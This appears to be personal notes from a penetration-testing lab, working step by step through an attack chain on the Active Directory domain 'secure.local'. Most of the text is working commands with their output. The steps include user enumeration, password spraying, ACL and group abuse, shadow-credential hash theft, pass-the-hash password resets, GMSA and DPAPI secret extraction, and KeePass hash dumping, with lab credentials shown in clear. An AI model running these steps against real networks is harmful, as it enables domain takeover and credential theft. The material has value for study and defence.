


```
kali@kali ~> nbtscan 192.168.96.0/24
Doing NBT name scan for addresses from 192.168.96.0/24

IP address       NetBIOS Name     Server    User             MAC address      
------------------------------------------------------------------------------
192.168.96.1     DESKTOP-1G36TVE  <server>  <unknown>        0a:00:27:00:00:05
192.168.96.101   FILE01           <server>  <unknown>        08:00:27:f0:b0:43
192.168.96.100   DC               <server>  <unknown>        08:00:27:3d:fb:72

```




Nmap scan 

```
kali@kali ~> nmap -sC -sV -Pn -iL targets.txt
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-16 15:55 EDT
Stats: 0:01:25 elapsed; 0 hosts completed (2 up), 2 undergoing Script Scan
NSE Timing: About 99.90% done; ETC: 15:57 (0:00:00 remaining)
Stats: 0:01:45 elapsed; 0 hosts completed (2 up), 2 undergoing Script Scan
NSE Timing: About 92.50% done; ETC: 15:57 (0:00:00 remaining)
Nmap scan report for 192.168.96.100
Host is up (0.00081s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-03-17 05:56:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: secure.local0., Site: Default-First-Site-Name) <----- add to /etc/hosts secure.local
| ssl-cert: Subject: commonName=DC.secure.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.secure.local
| Not valid before: 2024-03-12T06:36:44
|_Not valid after:  2025-03-12T06:36:44
|_ssl-date: 2024-03-17T05:57:22+00:00; +10h00m00s from scanner time.
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: secure.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.secure.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.secure.local
| Not valid before: 2024-03-12T06:36:44
|_Not valid after:  2025-03-12T06:36:44
|_ssl-date: 2024-03-17T05:57:21+00:00; +9h59m59s from scanner time.
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: secure.local0., Site: Default-First-Site-Name)
|_ssl-date: 2024-03-17T05:57:22+00:00; +10h00m00s from scanner time.
| ssl-cert: Subject: commonName=DC.secure.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.secure.local
| Not valid before: 2024-03-12T06:36:44
|_Not valid after:  2025-03-12T06:36:44
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: secure.local0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC.secure.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:DC.secure.local
| Not valid before: 2024-03-12T06:36:44
|_Not valid after:  2025-03-12T06:36:44
|_ssl-date: 2024-03-17T05:57:21+00:00; +9h59m59s from scanner time. 
3389/tcp open  ms-wbt-server Microsoft Terminal Services    <--------------------------------- RDP OPEN HERE
|_ssl-date: 2024-03-17T05:57:21+00:00; +9h59m59s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: SECURE
|   NetBIOS_Domain_Name: SECURE
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: secure.local
|   DNS_Computer_Name: DC.secure.local
|   DNS_Tree_Name: secure.local
|   Product_Version: 10.0.20348
|_  System_Time: 2024-03-17T05:56:40+00:00
| ssl-cert: Subject: commonName=DC.secure.local
| Not valid before: 2024-03-10T00:22:54
|_Not valid after:  2024-09-09T00:22:54
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 9h59m59s, deviation: 0s, median: 9h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_nbstat: NetBIOS name: DC, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:3d:fb:72 (Oracle VirtualBox virtual NIC)
| smb2-time: 
|   date: 2024-03-17T05:56:40
|_  start_date: N/A


-----------------------------------------------------------------------------------------------------------------------------------------------------------

Nmap scan report for 192.168.96.101
Host is up (0.0014s latency).
Not shown: 997 filtered tcp ports (no-response)
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2024-03-17T05:56:40
|_  start_date: N/A
|_clock-skew: 9h59m58s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled but not required
|_nbstat: NetBIOS name: FILE01, NetBIOS user: <unknown>, NetBIOS MAC: 08:00:27:f0:b0:43 (Oracle VirtualBox virtual NIC)

Post-scan script results:
| clock-skew: 
|   9h59m59s: 
|     192.168.96.100
|_    192.168.96.101
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 2 IP addresses (2 hosts up) scanned in 106.68 seconds
```

pre-auth enumeration

```

kali@kali ~> kerbrute userenum -d secure.local --dc 192.168.96.100 /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt

    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - 05/14/24 - Ronnie Flathers @ropnop

2024/05/14 17:43:42 >  Using KDC(s):
2024/05/14 17:43:42 >  	192.168.96.100:88

2024/05/14 17:43:42 >  [+] VALID USERNAME:	 michael@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 peter@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 simon@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 Michael@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 Peter@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 julia@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 blade@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 potter@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 nate@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 administrator@secure.local
2024/05/14 17:43:42 >  [+] VALID USERNAME:	 MICHAEL@secure.local
2024/05/14 17:43:43 >  [+] VALID USERNAME:	 ted@secure.local
2024/05/14 17:43:43 >  [+] VALID USERNAME:	 noah@secure.local
2024/05/14 17:43:43 >  [+] VALID USERNAME:	 Simon@secure.local
2024/05/14 17:43:43 >  [+] VALID USERNAME:	 randal@secure.local
2024/05/14 17:43:44 >  [+] VALID USERNAME:	 PETER@secure.local
2024/05/14 17:43:44 >  [+] VALID USERNAME:	 Blade@secure.local
2024/05/14 17:43:46 >  [+] VALID USERNAME:	 Julia@secure.local
2024/05/14 17:43:46 >  [+] VALID USERNAME:	 Administrator@secure.local
2024/05/14 17:43:47 >  [+] VALID USERNAME:	 Potter@secure.local
2024/05/14 17:43:48 >  [+] VALID USERNAME:	 SIMON@secure.local
2024/05/14 17:43:49 >  [+] VALID USERNAME:	 Randal@secure.local
2024/05/14 17:43:49 >  [+] VALID USERNAME:	 writer@secure.local
2024/05/14 17:43:51 >  [+] VALID USERNAME:	 Ted@secure.local
2024/05/14 17:43:54 >  [+] VALID USERNAME:	 BLADE@secure.local
2024/05/14 17:43:58 >  [+] VALID USERNAME:	 Nate@secure.local
2024/05/14 17:43:58 >  [+] VALID USERNAME:	 NATE@secure.local
2024/05/14 17:44:02 >  [+] VALID USERNAME:	 TED@secure.local
2024/05/14 17:44:02 >  [+] VALID USERNAME:	 Noah@secure.local
2024/05/14 17:44:09 >  [+] VALID USERNAME:	 POTTER@secure.local
2024/05/14 17:44:24 >  [+] VALID USERNAME:	 artu@secure.local
2024/05/14 17:44:33 >  [+] VALID USERNAME:	 testuser@secure.local
2024/05/14 17:45:33 >  [+] VALID USERNAME:	 PeTer@secure.local
2024/05/14 17:45:36 >  [+] VALID USERNAME:	 JULIA@secure.local

```

```
kali@kali ~/krbrelayx (master) [1]> python dnstool.py -u secure\\randal -p 'randal' --action add --record 123test.secure.local --data 192.168.96.102 --type A DC.secure.local -dc-ip 192.168.96.100 -dns-ip 192.168.96.100
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully

```

the issue was the `-dns-ip`, it makes sense why it wasnt picking it up. thanks chatgpt

```
nxc smb 192.168.96.100 -u users.txt -p 'Testi1ng4cc0unt!?' --continue-on-success
[SNIP]
SMB         192.168.96.100  445    DC               [+] secure.local\\testuser:Testi1ng4cc0unt!?
SMB         192.168.96.100  445    DC               [+] secure.local\\peter:Testi1ng4cc0unt!?
[SNIP]
```


```
kali@kali ~> bloodyAD --host 192.168.96.100 -d secure.local -u 'peter' -p 'Testi1ng4cc0unt!?' add groupMember "Group Management" peter
[+] peter added to Group Management
```

```
kali@kali ~> bloodyAD --host 192.168.96.100 -d secure.local -u peter -p 'Testi1ng4cc0unt!?' get membership peter

distinguishedName: CN=Group Management,CN=Users,DC=secure,DC=local
objectSid: S-1-5-21-3208886066-3809316082-4143998704-1118
sAMAccountName: Group Management

distinguishedName: CN=Domain Users,CN=Users,DC=secure,DC=local
objectSid: S-1-5-21-3208886066-3809316082-4143998704-513
sAMAccountName: Domain Users

distinguishedName: CN=Users,CN=Builtin,DC=secure,DC=local
objectSid: S-1-5-32-545
sAMAccountName: Users
```


```
kali@kali ~> bloodyAD --host 192.168.96.100 -d secure.local -u 'peter' -p 'Testi1ng4cc0unt!?' get writable

distinguishedName: CN=HelpDesk,CN=Users,DC=secure,DC=local
DACL: WRITE   

distinguishedName: CN=peter,CN=Users,DC=secure,DC=local
permission: WRITE

distinguishedName: CN=S-1-5-11,CN=ForeignSecurityPrincipals,DC=secure,DC=local
permission: WRITE

```


```
kali@kali ~> bloodyAD --host "192.168.96.100" -d "secure.local" -u "peter" -p "Testi1ng4cc0unt!?" add genericAll HelpDesk peter
[+] peter has now GenericAll on HelpDesk

kali@kali ~> bloodyAD --host 192.168.96.100 -d secure.local -u 'peter' -p 'Testi1ng4cc0unt!?' add groupMember "HelpDesk" peter
[+] peter added to HelpDesk
```


Lets confirm we are in that group now.

```
kali@kali ~> bloodyAD --host 192.168.96.100 -d secure.local -u peter -p 'Testi1ng4cc0unt!?' get membership peter

distinguishedName: CN=HelpDesk,CN=Users,DC=secure,DC=local
objectSid: S-1-5-21-3208886066-3809316082-4143998704-1128
sAMAccountName: HelpDesk

distinguishedName: CN=Group Management,CN=Users,DC=secure,DC=local
objectSid: S-1-5-21-3208886066-3809316082-4143998704-1118
sAMAccountName: Group Management

distinguishedName: CN=Domain Users,CN=Users,DC=secure,DC=local
objectSid: S-1-5-21-3208886066-3809316082-4143998704-513
sAMAccountName: Domain Users

distinguishedName: CN=Users,CN=Builtin,DC=secure,DC=local
objectSid: S-1-5-32-545
sAMAccountName: Users

```

When trying to do shadow credentials attack we get an error

```
kali@kali ~> certipy shadow auto -username peter@secure.local -p "Testi1ng4cc0unt!?" -account Ted -dc-ip 192.168.96.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ted'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b2763cb6-2a20-43c1-eec4-5a375b07056e'
[*] Adding Key Credential with device ID 'b2763cb6-2a20-43c1-eec4-5a375b07056e' to the Key Credentials for 'ted'
[*] Successfully added Key Credential with device ID 'b2763cb6-2a20-43c1-eec4-5a375b07056e' to the Key Credentials for 'ted'
[*] Authenticating as 'ted' with the certificate
[*] Using principal: ted@secure.local
[*] Trying to get TGT...
[-] Got error while trying to request TGT: Kerberos SessionError: KRB_AP_ERR_SKEW(Clock skew too great)    <--------------------------
[*] Restoring the old Key Credentials for 'ted'
[*] Successfully restored the old Key Credentials for 'ted'
[*] NT hash for 'ted': None

```


```
kali@kali ~> timedatectl set-ntp off
==== AUTHENTICATING FOR org.freedesktop.timedate1.set-ntp ====
Authentication is required to control whether network time synchronization shall be enabled.
Authenticating as: ,,, (kali)
Password:
==== AUTHENTICATION COMPLETE ====


kali@kali ~> sudo rdate -n 192.168.96.100
Tue May 14 16:40:58 EDT 2024


kali@kali ~> certipy shadow auto -username peter@secure.local -p "Testi1ng4cc0unt!?" -account Ted -dc-ip 192.168.96.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'ted'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '03cfbe64-814c-7c55-d129-690f181fc562'
[*] Adding Key Credential with device ID '03cfbe64-814c-7c55-d129-690f181fc562' to the Key Credentials for 'ted'
[*] Successfully added Key Credential with device ID '03cfbe64-814c-7c55-d129-690f181fc562' to the Key Credentials for 'ted'
[*] Authenticating as 'ted' with the certificate
[*] Using principal: ted@secure.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ted.ccache'
[*] Trying to retrieve NT hash for 'ted'
[*] Restoring the old Key Credentials for 'ted'
[*] Successfully restored the old Key Credentials for 'ted'
[*] NT hash for 'ted': 9803a64cf5c6bac5738ee244e5871466
```


```
kali@kali ~> nxc smb 192.168.96.100 -u ted -H 9803a64cf5c6bac5738ee244e5871466
SMB         192.168.96.100  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:secure.local) (signing:True) (SMBv1:False)
SMB         192.168.96.100  445    DC               [+] secure.local\ted:9803a64cf5c6bac5738ee244e5871466
```

BloodyAD doesnt work for some reason with anything password related, it interacts oddly with LDAP but with getting member information it works?

```
kali@kali ~ [1]> bloodyAD --host "192.169.96.100" -d "secure.local" -u "ted" -p ":9803a64cf5c6bac5738ee244e5871466" set password noah NewPassword
Traceback (most recent call last):
  File "/home/kali/.local/bin/bloodyAD", line 8, in <module>
    sys.exit(main())
             ^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/main.py", line 129, in main
    output = args.func(conn, **params)
             ^^^^^^^^^^^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/cli_modules/set.py", line 72, in password
    conn.ldap.bloodymodify(target, {"unicodePwd": op_list})
    ^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/config.py", line 71, in ldap
    self._ldap = Ldap(self.conf)
                 ^^^^^^^^^^^^^^^
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/network/ldap.py", line 86, in __init__
    self.bind()
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/bloodyAD/patch/ldap3_patch.py", line 247, in bind
    self.open(read_server_info=False)
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/ldap3/strategy/sync.py", line 57, in open
    BaseStrategy.open(self, reset_usage, read_server_info)
  File "/home/kali/.local/share/pipx/venvs/bloodyad/lib/python3.11/site-packages/ldap3/strategy/base.py", line 146, in open
    raise exception_history[0][0]
ldap3.core.exceptions.LDAPSocketOpenError: socket connection error while opening: [Errno 113] No route to host

```

lets set this password for noah

```
kali@kali ~> pth-net rpc password noah -U secure.local/ted%ffffffffffffffffffffffffffffffff:9803a64cf5c6bac5738ee244e5871466 -S 192.168.96.100
Enter new password for noah:
E_md4hash wrapper called.
HASH PASS: Substituting user supplied NTLM HASH...
```

```
kali@kali ~> bloodyAD --host 192.168.96.100 -d secure.local -u noah -p 'n3wP4ssw0rd!' get membership noah

distinguishedName: CN=Domain Users,CN=Users,DC=secure,DC=local
objectSid: S-1-5-21-3208886066-3809316082-4143998704-513
sAMAccountName: Domain Users

distinguishedName: CN=Remote Management Users,CN=Builtin,DC=secure,DC=local
objectSid: S-1-5-32-580
sAMAccountName: Remote Management Users

distinguishedName: CN=Users,CN=Builtin,DC=secure,DC=local
objectSid: S-1-5-32-545
sAMAccountName: Users

```



shell as noah into the thing we can see a folder that already pops out alot

```
*Evil-WinRM* PS C:\Users\noah> ls


    Directory: C:\Users\noah


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         3/11/2024  11:52 PM                3D Objects
d-r---         3/11/2024  11:52 PM                Contacts
d-r---         3/11/2024  11:52 PM                Desktop
d-r---         3/11/2024  11:52 PM                Documents
d-r---         5/14/2024   2:00 PM                Downloads
d-r---         3/11/2024  11:52 PM                Favorites
d-r---         3/11/2024  11:52 PM                Links
d-----         3/11/2024  11:55 PM                management    <---------------------
d-r---         3/11/2024  11:52 PM                Music
d-r---         3/11/2024  11:52 PM                Pictures
d-r---         3/11/2024  11:52 PM                Saved Games
d-r---         3/11/2024  11:52 PM                Searches
d-r---         3/11/2024  11:52 PM                Videos

```

its the `management` folder, so lets dive deeper into it

```
*Evil-WinRM* PS C:\Users\noah\management> ls


    Directory: C:\Users\noah\management


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         3/11/2024  11:55 PM           1498 credentials.xml
```

interesting....

```
*Evil-WinRM* PS C:\Users\noah\management> cat credentials.xml
<Objs Version="1.1.0.1" xmlns="http://schemas.microsoft.com/powershell/2004/04">
  <Obj RefId="0">
    <TN RefId="0">
      <T>System.Management.Automation.PSCredential</T>
      <T>System.Object</T>
    </TN>
    <ToString>System.Management.Automation.PSCredential</ToString>
    <Props>
      <S N="UserName">potter</S>
      <SS N="Password">01000000d08c9ddf0115d1118c7a00c04fc297eb0100000034fc37c7a69e9943864d643e28f8caa20000000002000000000003660000c00000001000000075ee9f593270a9330e51069fb4f2e2130000000004800000a000000010000000238a64cbb63ff89f5d66e15bd5681952280000004c7ee3f4d82a36dbe7637f538037013cccd4ee4285e2a5084937181d795352dbc9a1610e8efabd09140000000c763850a74143d1948385c208d4b657ec967db1</SS>
    </Props>
  </Obj>
</Objs>

```

Now the first thing i looked up for online is "how do decrypt `System.Management.Automation.PSCredential`" 

https://get-cmd.com/?p=5334  <----- we need to be as noah when we do this decryption stuff, so we need to do it while we are in winrm
https://www.travisgan.com/2015/06/powershell-password-encryption.html
https://stackoverflow.com/questions/61152594/retrieve-password-from-import-clixml-to-login-sqlplus-using-powershell-get-crede


```
*Evil-WinRM* PS C:\Users\noah\management> $credentials = Import-Clixml -Path "credentials.xml"
*Evil-WinRM* PS C:\Users\noah\management> $username = $credentials.UserName
*Evil-WinRM* PS C:\Users\noah\management> $username
potter
*Evil-WinRM* PS C:\Users\noah\management> $password = $credentials.GetNetworkCredential().password
*Evil-WinRM* PS C:\Users\noah\management> $password
f8gQ8fynP44ek1m3
```

or

```
*Evil-WinRM* PS C:\Users\noah\management> $UserCred = Import-Clixml -Path credentials.xml
*Evil-WinRM* PS C:\Users\noah\management> $Password = $UserCred.GetNetworkCredential().Password
*Evil-WinRM* PS C:\Users\noah\management> $Password
f8gQ8fynP44ek1m3
```

now we spray that and we get a user called `michael`, when enumerating them on bloodhound we can see there is an outbound permission

![[Notes here i guess-20240514145821599.webp|980]]


```
kali@kali ~> pth-net rpc password "DELEGATOR" "newP@ssword2022" -U "secure.local"/"michael"%"f8gQ8fynP44ek1m3" -S "192.168.96.100"
E_md4hash wrapper called.
```

```
kali@kali ~> nxc smb 192.168.96.100 -u delegator -p "newP@ssword2022"
SMB         192.168.96.100  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:secure.local) (signing:True) (SMBv1:False)
SMB         192.168.96.100  445    DC               [+] secure.local\delegator:newP@ssword2022
```

```
kali@kali ~> impacket-findDelegation secure.local/delegator:newP@ssword2022  -dc-ip 192.168.96.100
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

AccountName  AccountType  DelegationType  DelegationRightsTo
-----------  -----------  --------------  ------------------------
delegator    Person       Constrained     cifs/FILE01.secure.local
delegator    Person       Constrained     cifs/FILE01
```





---

## Reading GMSA

```
kali@kali ~ [2]> nxc ldap 192.168.96.100 -u blade -p 'JaySmS143!' --gmsa
SMB         192.168.96.100  445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:secure.local) (signing:True) (SMBv1:False)
LDAPS       192.168.96.100  636    DC               [+] secure.local\blade:JaySmS143!
LDAPS       192.168.96.100  636    DC               [*] Getting GMSA Passwords
LDAPS       192.168.96.100  636    DC               Account: svc_msa$             NTLM: 7259d677d2ceb2333fd77145091185f2
```




## WriteOwner Abuse

There are 3 steps to this.

1. Writing the owner to yourself
2. Giving yourself all permissions
3. Adding yourself to the group

```
kali@kali ~> owneredit.py 'secure.local/svc_msa$' -hashes ":7259d677d2ceb2333fd77145091185f2" -new-owner svc_msa\$ -target "Service Admins" -action write
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Current owner information below
[*] - SID: S-1-5-21-3208886066-3809316082-4143998704-512
[*] - sAMAccountName: Domain Admins
[*] - distinguishedName: CN=Domain Admins,CN=Users,DC=secure,DC=local
[*] OwnerSid modified successfully!
```

```
kali@kali ~> dacledit.py -action write -principal 'svc_msa$' -target 'Service Admins' -rights FullControl 'secure.local/svc_msa$' -hashes ":7259d677d2ceb2333fd77145091185f2"
Impacket v0.12.0.dev1+20240509.95404.2a65d8d - Copyright 2023 Fortra

[*] DACL backed up to dacledit-20240517-111125.bak
[*] DACL modified successfully!
```

```
kali@kali ~> bloodyAD --host 192.168.96.100 -d secure.local -u 'svc_msa$' -p ':7259d677d2ceb2333fd77145091185f2' add groupMember "Service Admins" svc_msa\$
[+] svc_msa$ added to Service Admins

```
## WriteDACL OU abuse

```
kali@kali ~> dacledit.py -action write -principal 'svc_msa$' -target-dn 'OU=MANAGEMENT,DC=SECURE,DC=LOCAL' -rights FullControl -inheritance 'secure.local/svc_msa$' -hashes ":7259d677d2
ceb2333fd77145091185f2"
Impacket v0.12.0.dev1+20240509.95404.2a65d8d - Copyright 2023 Fortra

[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU
[*] DACL backed up to dacledit-20240517-111725.bak
[*] DACL modified successfully!

```


after having full permissions of the domain we could use shadow credentials to get the password of nate! 

```
kali@kali ~> certipy shadow auto -username svc_msa\$@secure.local -hashes ":7259d677d2ceb2333fd77145091185f2" -account nate -dc-ip 192.168.96.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Targeting user 'nate'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID '78bce30f-1c2c-0b97-d96c-ea4cb8e6c36c'
[*] Adding Key Credential with device ID '78bce30f-1c2c-0b97-d96c-ea4cb8e6c36c' to the Key Credentials for 'nate'
[*] Successfully added Key Credential with device ID '78bce30f-1c2c-0b97-d96c-ea4cb8e6c36c' to the Key Credentials for 'nate'
[*] Authenticating as 'nate' with the certificate
[*] Using principal: nate@secure.local
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'nate.ccache'
[*] Trying to retrieve NT hash for 'nate'
[*] Restoring the old Key Credentials for 'nate'
[*] Successfully restored the old Key Credentials for 'nate'
[*] NT hash for 'nate': f64a8222dd857fc547e7fca10a94ac28

```


## KeepPass cracking

```
*Evil-WinRM* PS C:\Users\nate> tree /a /f
Folder PATH listing
Volume serial number is A239-F5E5
C:.
+---Desktop
+---Documents
+---Downloads
+---Favorites
+---Links
+---Music
+---Pictures
|       Passwords.kdbx
|
+---Saved Games
\---Videos
```


```
kali@kali ~> keepass2john Passwords.kdbx
Passwords:$keepass$*2*70000*0*ca57515898c7460a7eddefcbe478d9de25ec178892c3bfb2104d1170a8389c8a*dbe5af800dfeb283a94801c95c86850a5ec03b2ea12fdc083ad39065ba01aeb8*a0eddebc185d7145d80786d6dbd75616*3e35ba43c7f6c7e969e4fc08b6eecc55796cf8e030080b3ef9082d7284113951*6afa47967c1cf2d568b17b2039daa80d4dcc8d767578cee496d672749ce183ca
```

## DPAPI

Location of DP API
```
PS C:\Users\artu> gci -Force C:\users\artu\appdata\local\microsoft\credentials\3DE49F4606FFADA3457DB052E968C003
```

```
gci -Force C:\users\artu\appdata\roaming\microsoft\protect\S-1-5-21-3208886066-3809316082-4143998704-1116\dd1d191a-dc9b-4d60-8870-bbe0f041a3b9
```


```
kali@kali ~> dpapi.py masterkey -file dd1d191a-dc9b-4d60-8870-bbe0f041a3b9  -sid S-1-5-21-3208886066-3809316082-4143998704-1116 -password 'I_d0nTL1ke#W1nd0wS!'
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[MASTERKEYFILE]
Version     :        2 (2)
Guid        : dd1d191a-dc9b-4d60-8870-bbe0f041a3b9
Flags       :        0 (0)
Policy      :        0 (0)
MasterKeyLen: 00000088 (136)
BackupKeyLen: 00000068 (104)
CredHistLen : 00000000 (0)
DomainKeyLen: 00000174 (372)

Decrypted key with User Key (MD4 protected)
Decrypted key: 0x30b6d35ffe0bf111c1efc2fbf9e9ed750bdf160f03a122bdeb9714fdd11c8ddc4aa5eebfc24dff06f0ef41573b04e3ff8e5a42c8b05858d7b0cc1f5becc68918
```


```
kali@kali ~ [2]> dpapi.py credential -file 3DE49F4606FFADA3457DB052E968C003 -key 0x30b6d35ffe0bf111c1efc2fbf9e9ed750bdf160f03a122bdeb9714fdd11c8ddc4aa5eebfc24dff06f0ef41573b04e3ff8e5a42c8b05858d7b0cc1f5becc68918
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[CREDENTIAL]
LastWritten : 2024-03-11 00:38:32
Flags       : 0x00000030 (CRED_FLAGS_REQUIRE_CONFIRMATION|CRED_FLAGS_WILDCARD_MATCH)
Persist     : 0x00000002 (CRED_PERSIST_LOCAL_MACHINE)
Type        : 0x00000002 (CRED_TYPE_DOMAIN_PASSWORD)
Target      : Domain:target=TERMSRV/file01.secure.local
Description :
Unknown     :
Username    : SECURE\writer
Unknown     : ?retirwH4sAsTr0ngP@$$w0rd!
```

